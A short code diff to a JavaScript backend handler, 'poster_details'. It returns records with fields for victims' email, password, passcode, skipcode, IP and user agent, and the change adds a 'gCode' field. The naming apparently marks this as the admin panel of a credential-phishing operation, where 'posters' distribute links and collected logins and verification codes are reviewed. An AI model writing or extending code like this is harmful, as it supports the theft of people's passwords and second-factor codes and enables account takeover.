@@ -642,7 +642,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password ip agent status number createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password gCode ip agent status number createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
